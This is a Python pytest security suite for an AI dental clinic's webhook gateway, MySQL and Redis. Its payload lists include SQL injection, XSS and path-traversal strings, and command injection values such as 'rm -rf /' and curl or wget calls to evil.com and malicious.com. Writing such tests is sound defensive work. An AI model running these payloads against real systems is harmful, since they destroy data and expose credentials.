"""
Security Testing Suite for AI Dental Clinic System
בדיקות אבטחה למערכת ניהול מרפאת שיניים AI

Comprehensive security testing including:
- Input validation testing
- SQL injection attempts
- XSS payload testing
- Authentication bypass attempts
- Rate limiting validation
- Data exposure testing
"""

import pytest
import asyncio
import json
import time
import hashlib
import hmac
import base64
from typing import Dict, List, Any
import httpx
import redis
import mysql.connector
from unittest.mock import patch

# Security test configuration
SECURITY_CONFIG = {
    "gateway_url": "http://localhost:8000",
    "ai_agents_url": "http://localhost:8001",
    "redis_url": "redis://localhost:6379/1",
    "mysql_config": {
        "host": "localhost",
        "port": 3306,
        "user": "root",
        "password": "test_password",
        "database": "dental_clinic_test"
    }
}

# Malicious payloads for testing
SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE patients; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM patients --",
    "'; INSERT INTO patients (name) VALUES ('hacker'); --",
    "' OR 1=1 LIMIT 1 --",
    "'; UPDATE patients SET name='hacked' WHERE id=1; --",
    "' AND (SELECT COUNT(*) FROM patients) > 0 --",
    "'; EXEC xp_cmdshell('dir'); --"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>"
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "&& whoami",
    "; rm -rf /",
    "| nc -l 4444",
    "; curl http://evil.com/steal",
    "&& python -c 'import os; os.system(\"id\")'",
    "; wget http://malicious.com/backdoor.sh"
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc//passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
]

BUFFER_OVERFLOW_PAYLOADS = [
    "A" * 1000,
    "A" * 10000,
    "A" * 100000,
    "\x00" * 1000,
    "\xff" * 1000,
    "🦷" * 1000  # Unicode overflow
]

class SecurityTestBase:
    """Base class for security tests"""
    
    @staticmethod
    def generate_webhook_signature(payload: str, secret: str = "test_secret") -> str:
        """Generate webhook signature for testing"""
        signature = hmac.new(
            secret.encode(),
            payload.encode(),
            hashlib.sha256
        ).hexdigest()
        return f"sha256={signature}"
    
    @staticmethod
    def create_malicious_webhook(payload_type: str, malicious_content: str) -> Dict[str, Any]:
        """Create webhook with malicious content"""
        if payload_type == "whatsapp":
            return {
                "entry": [{
                    "changes": [{
                        "value": {
                            "messages": [{
                                "id": f"malicious_{int(time.time())}",
                                "from": malicious_content,  # Inject into phone number
                                "text": {"body": malicious_content},
                                "timestamp": str(int(time.time()))
                            }]
                        }
                    }]
                }]
            }
        elif payload_type == "telegram":
            return {
                "update_id": 123456789,
                "message": {
                    "message_id": 1,
                    "from": {
                        "id": 987654321,
                        "first_name": malicious_content,  # Inject into name
                        "username": malicious_content
                    },
                    "chat": {
                        "id": 987654321,
                        "type": "private"
                    },
                    "date": int(time.time()),
                    "text": malicious_content
                }
            }

@pytest.mark.security
class TestInputValidation(SecurityTestBase):
    """Test input validation and sanitization"""
    
    @pytest.mark.asyncio
    async def test_sql_injection_protection(self):
        """Test protection against SQL injection attacks"""
        async with httpx.AsyncClient() as client:
            for payload in SQL_INJECTION_PAYLOADS:
                # Test WhatsApp webhook
                webhook_data = self.create_malicious_webhook("whatsapp", payload)
                
                response = await client.post(
                    f"{SECURITY_CONFIG['gateway_url']}/webhooks/whatsapp",
                    json=webhook_data
                )
                
                # Should not return 500 (server error) or expose database errors
                assert response.status_code != 500, f"SQL injection caused server error: {payload}"
                
                if response.status_code == 200:
                    data = response.json()
                    # Check that response doesn't contain SQL error messages
                    response_text = json.dumps(data).lower()
                    sql_error_indicators = [
                        "sql", "mysql", "syntax error", "table", "column",
                        "database", "select", "insert", "update", "delete"
                    ]
                    for indicator in sql_error_indicators:
                        assert indicator not in response_text, f"SQL error exposed: {indicator}"
    
    @pytest.mark.asyncio
    async def test_xss_protection(self):
        """Test protection against XSS attacks"""
        async with httpx.AsyncClient() as client:
            for payload in XSS_PAYLOADS:
                webhook_data = self.create_malicious_webhook("telegram", payload)
                
                response = await client.post(
                    f"{SECURITY_CONFIG['gateway_url']}/webhooks/telegram",
                    json=webhook_data
                )
                
                # Should handle XSS payloads gracefully
                assert response.status_code in [200, 400, 422], f"XSS payload caused unexpected error: {payload}"
                
                if response.status_code == 200:
                    data = response.json()
                    response_text = json.dumps(data)
                    # Check that script tags are not reflected back
                    assert "<script>" not in response_text, "XSS payload reflected in response"
                    assert "javascript:" not in response_text, "JavaScript URL reflected in response"
    
    @pytest.mark.asyncio
    async def test_command_injection_protection(self):
        """Test protection against command injection"""
        async with httpx.AsyncClient() as client:
            for payload in COMMAND_INJECTION_PAYLOADS:
                webhook_data = self.create_malicious_webhook("whatsapp", payload)
                
                response = await client.post(
                    f"{SECURITY_CONFIG['gateway_url']}/webhooks/whatsapp",
                    json=webhook_data
                )
                
                # Should not execute system commands
                assert response.status_code != 500, f"Command injection caused server error: {payload}"
                
                if response.status_code == 200:
                    data = response.json()
                    response_text = json.dumps(data).lower()
                    # Check for command execution indicators
                    command_indicators = ["root:", "uid=", "gid=", "bin/", "etc/passwd"]
                    for indicator in command_indicators:
                        assert indicator not in response_text, f"Command execution detected: {indicator}"
    
    @pytest.mark.asyncio
    async def test_buffer_overflow_protection(self):
        """Test protection against buffer overflow attacks"""
        async with httpx.AsyncClient() as client:
            for payload in BUFFER_OVERFLOW_PAYLOADS:
                webhook_data = self.create_malicious_webhook("telegram", payload)
                
                try:
                    response = await client.post(
                        f"{SECURITY_CONFIG['gateway_url']}/webhooks/telegram",
                        json=webhook_data,
                        timeout=10.0  # Prevent hanging
                    )
                    
                    # Should handle large payloads gracefully
                    assert response.status_code in [200, 400, 413, 422], f"Buffer overflow caused unexpected response"
                    
                except httpx.TimeoutException:
                    pytest.fail(f"Buffer overflow caused timeout: {len(payload)} bytes")
                except httpx.RequestError as e:
                    pytest.fail(f"Buffer overflow caused connection error: {e}")

@pytest.mark.security
class TestAuthentication(SecurityTestBase):
    """Test authentication and authorization mechanisms"""
    
    @pytest.mark.asyncio
    async def test_webhook_signature_validation(self):
        """Test webhook signature validation"""
        async with httpx.AsyncClient() as client:
            webhook_data = {
                "entry": [{
                    "changes": [{
                        "value": {
                            "messages": [{
                                "id": "test_auth",
                                "from": "972501234567",
                                "text": {"body": "Test authentication"},
                                "timestamp": str(int(time.time()))
                            }]
                        }
                    }]
                }]
            }
            
            payload = json.dumps(webhook_data)
            
            # Test with invalid signature
            invalid_signature = "sha256=invalid_signature"
            headers = {"X-Hub-Signature-256": invalid_signature}
            
            response = await client.post(
                f"{SECURITY_CONFIG['gateway_url']}/webhooks/whatsapp",
                json=webhook_data,
                headers=headers
            )
            
            # Should reject invalid signatures (if signature validation is implemented)
            # For now, we just check it doesn't crash
            assert response.status_code in [200, 401, 403], "Invalid signature handling failed"
    
    @pytest.mark.asyncio
    async def test_api_key_validation(self):
        """Test API key validation for protected endpoints"""
        async with httpx.AsyncClient() as client:
            # Test without API key
            response = await client.get(f"{SECURITY_CONFIG['gateway_url']}/api/admin/stats")
            
            # Should require authentication (if implemented)
            assert response.status_code in [200, 401, 403, 404], "API key validation test"
            
            # Test with invalid API key
            headers = {"Authorization": "Bearer invalid_key"}
            response = await client.get(
                f"{SECURITY_CONFIG['gateway_url']}/api/admin/stats",
                headers=headers
            )
            
            assert response.status_code in [200, 401, 403, 404], "Invalid API key handling"

@pytest.mark.security
class TestRateLimiting(SecurityTestBase):
    """Test rate limiting and DoS protection"""
    
    @pytest.mark.asyncio
    async def test_rate_limiting_protection(self):
        """Test rate limiting on webhook endpoints"""
        async with httpx.AsyncClient() as client:
            webhook_data = {
                "entry": [{
                    "changes": [{
                        "value": {
                            "messages": [{
                                "id": f"rate_test_{i}",
                                "from": "972501234567",
                                "text": {"body": f"Rate test {i}"},
                                "timestamp": str(int(time.time()))
                            }]
                        }
                    }]
                }]
            }
            
            # Send rapid requests
            responses = []
            for i in range(50):  # Send 50 rapid requests
                webhook_data["entry"][0]["changes"][0]["value"]["messages"][0]["id"] = f"rate_test_{i}"
                webhook_data["entry"][0]["changes"][0]["value"]["messages"][0]["text"]["body"] = f"Rate test {i}"
                
                response = await client.post(
                    f"{SECURITY_CONFIG['gateway_url']}/webhooks/whatsapp",
                    json=webhook_data
                )
                responses.append(response.status_code)
                
                # Small delay to avoid overwhelming the test
                await asyncio.sleep(0.01)
            
            # Check if rate limiting is applied
            rate_limited_responses = [code for code in responses if code == 429]
            
            # If rate limiting is implemented, we should see some 429 responses
            # If not implemented, all should be 200 (which is also acceptable for testing)
            success_responses = [code for code in responses if code == 200]
            
            assert len(success_responses) > 0, "No successful responses received"
            
            # Log rate limiting effectiveness
            if rate_limited_responses:
                print(f"Rate limiting active: {len(rate_limited_responses)}/50 requests limited")
            else:
                print("Rate limiting not detected (may not be implemented)")

@pytest.mark.security
class TestDataExposure(SecurityTestBase):
    """Test for sensitive data exposure"""
    
    @pytest.mark.asyncio
    async def test_error_message_exposure(self):
        """Test that error messages don't expose sensitive information"""
        async with httpx.AsyncClient() as client:
            # Test malformed JSON
            response = await client.post(
                f"{SECURITY_CONFIG['gateway_url']}/webhooks/whatsapp",
                data="invalid json",
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code >= 400:
                response_text = response.text.lower()
                
                # Check for sensitive information exposure
                sensitive_patterns = [
                    "password", "secret", "key", "token",
                    "mysql", "redis", "database",
                    "traceback", "exception", "stack trace",
                    "/home/", "/usr/", "/var/",
                    "openai_api_key"
                ]
                
                for pattern in sensitive_patterns:
                    assert pattern not in response_text, f"Sensitive information exposed: {pattern}"
    
    @pytest.mark.asyncio
    async def test_debug_information_exposure(self):
        """Test that debug information is not exposed"""
        async with httpx.AsyncClient() as client:
            # Test various endpoints for debug information
            endpoints = [
                "/health",
                "/api/queue/stats",
                "/webhooks/whatsapp",
                "/webhooks/telegram"
            ]
            
            for endpoint in endpoints:
                if endpoint.startswith("/webhooks/"):
                    # Send invalid data to trigger potential debug output
                    response = await client.post(
                        f"{SECURITY_CONFIG['gateway_url']}{endpoint}",
                        json={"invalid": "data"}
                    )
                else:
                    response = await client.get(f"{SECURITY_CONFIG['gateway_url']}{endpoint}")
                
                response_text = response.text.lower()
                
                # Check for debug information
                debug_patterns = [
                    "debug", "trace", "stack", "exception",
                    "internal server error", "500 internal",
                    "file not found", "permission denied"
                ]
                
                for pattern in debug_patterns:
                    if pattern in response_text and response.status_code == 500:
                        pytest.fail(f"Debug information exposed in {endpoint}: {pattern}")

@pytest.mark.security
class TestDatabaseSecurity(SecurityTestBase):
    """Test database security measures"""
    
    @pytest.mark.mysql
    def test_database_connection_security(self):
        """Test database connection security"""
        try:
            # Test if database is accessible with weak credentials
            weak_passwords = ["", "password", "123456", "admin", "root"]
            
            for weak_password in weak_passwords:
                try:
                    conn = mysql.connector.connect(
                        host=SECURITY_CONFIG["mysql_config"]["host"],
                        port=SECURITY_CONFIG["mysql_config"]["port"],
                        user=SECURITY_CONFIG["mysql_config"]["user"],
                        password=weak_password,
                        database=SECURITY_CONFIG["mysql_config"]["database"],
                        connection_timeout=2
                    )
                    conn.close()
                    
                    if weak_password != SECURITY_CONFIG["mysql_config"]["password"]:
                        pytest.fail(f"Database accessible with weak password: '{weak_password}'")
                        
                except mysql.connector.Error:
                    # Good - weak password rejected
                    pass
                    
        except mysql.connector.Error:
            pytest.skip("MySQL not available for security testing")
    
    @pytest.mark.mysql
    def test_database_privilege_escalation(self):
        """Test for database privilege escalation vulnerabilities"""
        try:
            conn = mysql.connector.connect(**SECURITY_CONFIG["mysql_config"])
            cursor = conn.cursor()
            
            # Test if application user has excessive privileges
            dangerous_queries = [
                "CREATE DATABASE test_security",
                "DROP DATABASE test_security",
                "CREATE USER 'hacker'@'%' IDENTIFIED BY 'password'",
                "GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'",
                "SHOW GRANTS FOR CURRENT_USER()",
                "SELECT user, host FROM mysql.user"
            ]
            
            for query in dangerous_queries:
                try:
                    cursor.execute(query)
                    result = cursor.fetchall()
                    
                    if query.startswith("SHOW GRANTS"):
                        # Check if user has excessive privileges
                        grants = str(result).upper()
                        if "ALL PRIVILEGES" in grants and "ON *.*" in grants:
                            pytest.fail("Database user has excessive privileges")
                    elif query.startswith("SELECT user"):
                        # Should not be able to read user table
                        pytest.fail("Application can read mysql.user table")
                    else:
                        # Should not be able to execute administrative commands
                        pytest.fail(f"Dangerous query executed successfully: {query}")
                        
                except mysql.connector.Error:
                    # Good - dangerous query rejected
                    pass
            
            cursor.close()
            conn.close()
            
        except mysql.connector.Error:
            pytest.skip("MySQL not available for privilege testing")

@pytest.mark.security
class TestRedisSecurityTestRedis(SecurityTestBase):
    """Test Redis security measures"""
    
    @pytest.mark.redis
    def test_redis_authentication(self):
        """Test Redis authentication requirements"""
        try:
            # Test connection without authentication
            r = redis.from_url("redis://localhost:6379/1")
            r.ping()
            
            # Test if Redis accepts dangerous commands
            dangerous_commands = [
                "FLUSHALL",
                "CONFIG GET *",
                "CONFIG SET",
                "EVAL",
                "DEBUG"
            ]
            
            for command in dangerous_commands:
                try:
                    if command == "FLUSHALL":
                        # Don't actually execute FLUSHALL in test
                        pass
                    elif command == "CONFIG GET *":
                        result = r.execute_command("CONFIG", "GET", "*")
                        if result:
                            print(f"Warning: Redis CONFIG command accessible")
                    elif command == "EVAL":
                        # Test if Lua scripting is enabled
                        try:
                            r.eval("return 1", 0)
                            print(f"Warning: Redis EVAL command accessible")
                        except redis.ResponseError:
                            pass
                            
                except redis.ResponseError:
                    # Good - dangerous command rejected
                    pass
                    
        except redis.ConnectionError:
            pytest.skip("Redis not available for security testing")

# Security test runner
def run_security_tests():
    """Run all security tests"""
    print("🛡️ Starting Security Testing Suite")
    print("=" * 50)
    
    # Run tests with pytest
    pytest.main([
        "tests/security_testing/security_tests.py",
        "-v",
        "--tb=short",
        "-m", "security"
    ])

if __name__ == "__main__":
    run_security_tests()
